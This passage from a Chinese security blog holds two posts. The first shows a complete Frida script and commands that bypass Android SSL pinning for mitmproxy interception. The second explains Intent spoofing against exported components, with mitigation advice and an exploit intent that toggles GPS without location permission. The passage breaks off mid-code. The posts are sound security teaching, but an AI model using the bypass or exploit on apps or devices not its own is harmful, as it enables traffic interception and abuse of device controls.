devices.</td></tr></tbody></table><p>我们是 Android 应该使用 <code>mitmproxy-ca-cert.cer</code>，在 Android 系统安装的话，需要点击 设置 -〉安全 -〉 加密与凭证 -〉安装证书 -〉CA 证书</p><h3 id="使用-frida-绕过-SSL-pinning"><a href="#使用-frida-绕过-SSL-pinning" class="headerlink" title="使用 frida 绕过 SSL pinning"></a>使用 frida 绕过 SSL pinning</h3><p>使用 frida 脚本首先需要将 <code>mitmproxy-ca-cert.cer</code> 上传到 <code>/data/local/tmp/cert-der.crt</code></p><p>使用脚本 <a href="https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/">https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Android SSL Re-pinning frida script v0.2 030417-pier</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt</span><br><span class="hljs-comment">   $ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   UPDATE 20191605: Fixed undeclared var. Thanks to @oleavr and @ehsanpc9999 !</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;</span>);<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">CertificateFactory</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.security.cert.CertificateFactory&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">FileInputStream</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.io.FileInputStream&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">BufferedInputStream</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.io.BufferedInputStream&quot;</span>);<br>    <span class="hljs-keyword">var</span> X509Certificate = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.security.cert.X509Certificate&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">KeyStore</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.security.KeyStore&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TrustManagerFactory</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.TrustManagerFactory&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">SSLContext</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.SSLContext&quot;</span>);<br><br>    <span class="hljs-comment">// Load CAs from an InputStream</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Loading our CA...&quot;</span>)<br>    <span class="hljs-keyword">var</span> cf = <span class="hljs-title class_">CertificateFactory</span>.<span class="hljs-title function_">getInstance</span>(<span class="hljs-string">&quot;X.509&quot;</span>);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">var</span> fileInputStream = <span class="hljs-title class_">FileInputStream</span>.$new(<span class="hljs-string">&quot;/data/local/tmp/cert-der.crt&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[o] &quot;</span> + err);<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> bufferedInputStream = <span class="hljs-title class_">BufferedInputStream</span>.$new(fileInputStream);<br>    <span class="hljs-keyword">var</span> ca = cf.<span class="hljs-title function_">generateCertificate</span>(bufferedInputStream);<br>    bufferedInputStream.<span class="hljs-title function_">close</span>();<br><br>    <span class="hljs-keyword">var</span> certInfo = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(ca, X509Certificate);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[o] Our CA Info: &quot;</span> + certInfo.<span class="hljs-title function_">getSubjectDN</span>());<br><br>    <span class="hljs-comment">// Create a KeyStore containing our trusted CAs</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Creating a KeyStore for our CA...&quot;</span>);<br>    <span class="hljs-keyword">var</span> keyStoreType = <span class="hljs-title class_">KeyStore</span>.<span class="hljs-title function_">getDefaultType</span>();<br>    <span class="hljs-keyword">var</span> keyStore = <span class="hljs-title class_">KeyStore</span>.<span class="hljs-title function_">getInstance</span>(keyStoreType);<br>    keyStore.<span class="hljs-title function_">load</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    keyStore.<span class="hljs-title function_">setCertificateEntry</span>(<span class="hljs-string">&quot;ca&quot;</span>, ca);<br><br>    <span class="hljs-comment">// Create a TrustManager that trusts the CAs in our KeyStore</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;</span>);<br>    <span class="hljs-keyword">var</span> tmfAlgorithm = <span class="hljs-title class_">TrustManagerFactory</span>.<span class="hljs-title function_">getDefaultAlgorithm</span>();<br>    <span class="hljs-keyword">var</span> tmf = <span class="hljs-title class_">TrustManagerFactory</span>.<span class="hljs-title function_">getInstance</span>(tmfAlgorithm);<br>    tmf.<span class="hljs-title function_">init</span>(keyStore);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Our TrustManager is ready...&quot;</span>);<br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Hijacking SSLContext methods now...&quot;</span>)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;</span>)<br><br>    <span class="hljs-title class_">SSLContext</span>.<span class="hljs-property">init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="hljs-string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="hljs-string">&quot;java.security.SecureRandom&quot;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b,c</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;</span>);<br>      <span class="hljs-title class_">SSLContext</span>.<span class="hljs-property">init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="hljs-string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="hljs-string">&quot;java.security.SecureRandom&quot;</span>).<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, a, tmf.<span class="hljs-title function_">getTrustManagers</span>(), c);<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] SSLContext initialized with our custom TrustManager!&quot;</span>);<br>    &#125;<br>  &#125;);<br>&#125;,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>执行下面命令，绕过 SSL pinning</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -F<br><br>     ____<br>    / _  |   Frida <span class="hljs-number">14.2</span>.<span class="hljs-number">18</span> - A world-class dynamic instrumentation toolkit<br>   | (_| |<br>    &gt; _  |   Commands:<br>   <span class="hljs-regexp">/_/</span> |_|       help      -&gt; Displays the help system<br>   . . . .       object?   -&gt; Display information about <span class="hljs-string">&#x27;object&#x27;</span><br>   . . . .       <span class="hljs-keyword">exit</span>/quit -&gt; Exit<br>   . . . .<br>   . . . .   More info at https:<span class="hljs-regexp">//</span>frida.re<span class="hljs-regexp">/docs/</span>home/<br><br>[.] Cert Pinning Bypass/Re-Pinning<br>[+] Loading our CA...<br>[o] Our CA Info: O=mitmproxy, CN=mitmproxy<br>[+] Creating a KeyStore <span class="hljs-keyword">for</span> our CA...<br>[+] Creating a TrustManager that trusts the CA <span class="hljs-keyword">in</span> our KeyStore...<br>[+] Our TrustManager is ready...<br>[+] Hijacking SSLContext methods now...<br>[-] Waiting <span class="hljs-keyword">for</span> the app to invoke SSLContext.init()...<br>[Pixel <span class="hljs-number">2</span>::智能生活]-&gt; <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>其中 <code>-F</code> 参数 attach to frontmost application 不用指定 pid 或者包名，非常方便。</p><h3 id="使用-mitmweb-查看报文"><a href="#使用-mitmweb-查看报文" class="headerlink" title="使用 mitmweb 查看报文"></a>使用 mitmweb 查看报文</h3><p>执行 <code>mitmweb -p 8080</code> 后可以用浏览器访问 <a href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a> 查看报文，如果需要共享报文数据可以使用<br>mitmweb 界面提供的 save 功能，会保存成一个 flow 文件，后面使用 mitmweb 界面提供的 open 打开报文文件即可展示报文详细信息。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://shunix.com/ssl-pinning/">https://shunix.com/ssl-pinning/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Intent Spoofing 攻击</title>
    <link href="/cn/android_intent_base_attack/"/>
    <url>/cn/android_intent_base_attack/</url>
    
    <content type="html"><![CDATA[<h2 id="0-Android的安全模型"><a href="#0-Android的安全模型" class="headerlink" title="0. Android的安全模型"></a>0. Android的安全模型</h2><ul><li>application sandbox</li><li>selinux</li><li>permissions</li><li>application signing</li></ul><p>正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个<br>App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的<br>意图是什么，Android系统将调用相应的处理程序来处理。</p><p>Intent 是一个将要执行的动作的抽象的描述，一般来说是作为参数来使用，由Intent来协<br>助完成android各个组件之间的通讯。比如说调用startActivity()来启动一个activity,或<br>者由broadcaseIntent()来传递给所有感兴趣的BroadcaseReceiver, 再或者由<br>startService()&#x2F;bindservice()来启动一个后台的service.所以可以看出来，intent主要<br>是用来启动其他的activity 或者service，所以可以将intent理解成activity之间的粘合剂。</p><h2 id="1-Intent"><a href="#1-Intent" class="headerlink" title="1. Intent"></a>1. Intent</h2><p>Intent有两种类型，Explicit Intent 和 Implicit Intent。</p><ul><li>Explicit Intent</li></ul><p>明确指定Intent的名字(全类名)，当你使用Explicit Intent 启动Activity或者启动 Service，<br>Android系统会立即启动Intent对象所指定的Component。</p><ul><li>Implicit Intent</li></ul><p>指定Intent的ACTION，当你使用Implicit Intent，Android系统将通过比较 App Manifest<br>文件中所定义的Intent filter来启动符合要求的Component。如果只有一个Intentfilter<br>被匹配成功，系统将启动对应的Component，并递送Intent Object。如果有多个intent<br>filter是兼容的，系统将显示一个dialog，用户可以选择需要使用的component</p><p>下面用代码说明这两种Intent</p><p>Explicit Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">downloadIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>, DownloadService.class);<br>downloadIntent.setData(Uri.parse(fileUrl));<br>startService(downloadIntent);<br></code></pre></td></tr></table></figure><p>Implicit Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">sendIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>sendIntent.setAction(Intent.ACTION_SEND);<br>sendIntent.putExtra(Intent.EXTRA_TEXT, textMessage);<br>sendIntent.setType(HTTP.PLAIN_TEXT_TYPE); <span class="hljs-comment">// &quot;text/plain&quot; MIME type</span><br><br><span class="hljs-comment">// Verify that the intent will resolve to an activity</span><br><span class="hljs-keyword">if</span> (sendIntent.resolveActivity(getPackageManager()) != <span class="hljs-literal">null</span>) &#123;<br>    startActivity(sendIntent);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-Intent-Spoofing"><a href="#2-Intent-Spoofing" class="headerlink" title="2. Intent Spoofing"></a>2. Intent Spoofing</h2><p>Android Intent Spoofing是一个比较常见的问题。如果Android组件(component,service<br>receiver)是导出的话(exported&#x3D;true)，恶意程序可以使用 Explicit Intent向这个组件<br>发送Intent，Android无法识别这个 Intent是谁发送的，将会正常的执行请求的操作。</p><p>从上面的描述中可以发现，关键是 component要是导出的，而Android的component的导出的<br>默认值并不是固定的，这点我们从Google提供的文档可以证实。</p><p><a href="http://developer.android.com/guide/topics/manifest/receiver-element.html">http://developer.android.com/guide/topics/manifest/receiver-element.html</a></p><p><strong>android:exported</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Whether <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> the broadcast receiver can receive messages <span class="hljs-keyword">from</span> sources outside<br>its application — &quot;true&quot; <span class="hljs-keyword">if</span> it can, <span class="hljs-keyword">and</span> &quot;false&quot; <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>. <span class="hljs-keyword">If</span> &quot;false&quot;, the <span class="hljs-keyword">only</span> messages <br>the broadcast receiver can receive are those sent <span class="hljs-keyword">by</span> components <span class="hljs-keyword">of</span> the same <br>application <span class="hljs-keyword">or</span> applications <span class="hljs-keyword">with</span> the same <span class="hljs-keyword">user</span> ID.<br><br>The <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">depends</span> <span class="hljs-keyword">on</span> whether the broadcast receiver contains intent filters.<br>The absence <span class="hljs-keyword">of</span> <span class="hljs-keyword">any</span> filters means that it can be invoked <span class="hljs-keyword">only</span> <span class="hljs-keyword">by</span> Intent objects <br>that specify its exact <span class="hljs-keyword">class</span> <span class="hljs-type">name</span>. This implies that the receiver <span class="hljs-keyword">is</span> intended <br><span class="hljs-keyword">only</span> <span class="hljs-keyword">for</span> application-<span class="hljs-type">internal</span> use (since others would <span class="hljs-keyword">not</span> normally know the <span class="hljs-keyword">class</span> <span class="hljs-type">name</span>). <br>So <span class="hljs-keyword">in</span> this <span class="hljs-keyword">case</span>, the <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> &quot;false&quot;. <span class="hljs-keyword">On</span> the other hand, the presence <br><span class="hljs-keyword">of</span> at least one <span class="hljs-keyword">filter</span> implies that the broadcast receiver <span class="hljs-keyword">is</span> intended <span class="hljs-keyword">to</span> receive <br>intents broadcast <span class="hljs-keyword">by</span> the <span class="hljs-keyword">system</span> <span class="hljs-keyword">or</span> other applications, so the <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> &quot;true&quot;.<br><br>This <span class="hljs-keyword">attribute</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> the <span class="hljs-keyword">only</span> way <span class="hljs-keyword">to</span> <span class="hljs-keyword">limit</span> a broadcast receiver<span class="hljs-string">&#x27;s external exposure.</span><br><span class="hljs-string">You can also use a permission to limit the external entities that can send it </span><br><span class="hljs-string">messages (see the permission attribute).</span><br></code></pre></td></tr></table></figure><p>我写了一个程序测试具体的情况。</p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.RECEIVE_SMS&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PhoneReceiver&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.nsfocus.test&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>测试程序注册了一个Receiver，这个Receiver处理 com.nsfocus.test  <strong>Implicit Intent</strong><br>包含了一个Intent Filter，在AndroidManifest.xml中没有明确声明这个reciever是导出的<br>还是未导出的。</p><p>receiver 的代码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        Toast.makeText(context, <span class="hljs-string">&quot;Get it&quot;</span>, Toast.LENGTH_LONG).show();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用adb shell中发送广播</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell am broadcast -a com.nsfocus.test<br></code></pre></td></tr></table></figure><p>可以看到Get it 的提示信息，也就是说 component 处理 Implicit Intent 时默认是<br><strong>exported&#x3D;true</strong> 的，这就是问题的关键。</p><p>下面修改代码改成 <strong>exported&#x3D;false</strong>，看看是什么情况。</p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PhoneReceiver&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.nsfocus.test&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>receiver 照样可以收到，显示”Get it”，所以在receiver里做校验是非常有必要的。因为<br>无论exported如何设置，只要里面包含了Intent Filter 就可以接受到消息。</p><h3 id="2-1-一般解决方案"><a href="#2-1-一般解决方案" class="headerlink" title="2.1 一般解决方案"></a>2.1 一般解决方案</h3><p>如果设置了 intent-filter，可以利用 android:permission 属性来要求广播发送者所<br>需要具有的必要权限，这样才不会产生权限绕过问题。</p><p>比如我在.PhoneReceiver里要实现收短信的功能，就应该写成这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PhoneReceiver&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:permission</span>=<span class="hljs-string">&quot;android.permission.SMS_RECEIVED&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PHONE_STATE&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样广播发送者需要声明** android.permission.SMS_RECEIVED **权限，不然.PhoneReceiver就不<br>处理了，修改后测试发现确实收不到了。</p><h3 id="2-2-漏洞实例"><a href="#2-2-漏洞实例" class="headerlink" title="2.2 漏洞实例"></a>2.2 漏洞实例</h3><h4 id="启用手机GPS"><a href="#启用手机GPS" class="headerlink" title="启用手机GPS"></a>启用手机GPS</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>intent.setClassName(<span class="hljs-string">&quot;com.android.settings&quot;</span>, <span class="hljs-string">&quot;com.android.settings.widget.SettingsAppWidgetProvider&quot;</span>);<br>intent.addCategory(<span class="hljs-string">&quot;android.intent.category.ALTERNATIVE&quot;</span>);<br>intent.setData(Uri.parse(<span class="hljs-string">&quot;custom:3&quot;</span>));<br>mContext.sendBroadcast(intent);<br></code></pre></td></tr></table></figure><p>上面这个例子是通过广播的方法进行攻击的，攻击的目标是com.android.settings.widget<br>Android并未提供操作GPS的API，但是通过上面这个方法却可以控制GPS的开关。而且更有趣<br>的是我们并没有声明任何和Location相关的权限 :)</p><p>widget是Android提供的桌面的小插件，就和KDE的之类的插件类似，可以通过Google提供的<br>API来开发。</p><p>custom:3 这个字符串比较诡异，其实可以在Android 的代码中找到</p><p>&#x2F;com&#x2F;android&#x2F;settings&#x2F;widget&#x2F;SettingsAppWidgetProvider.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_WIFI</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_BRIGHTNESS</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_SYNC</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_LOCATION</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_BLUETOOTH</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>    <span class="hljs-built_in">super</span>.onReceive(context, intent);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> intent.getAction();<br>    <span class="hljs-keyword">if</span> (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action)) &#123;<br>        sWifiState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (BluetoothAdapter.ACTION_STATE_CHANGED.equals(action)) &#123;<br>        sBluetoothState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (LocationManager.MODE_CHANGED_ACTION.equals(action)) &#123;<br>        sLocationState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> 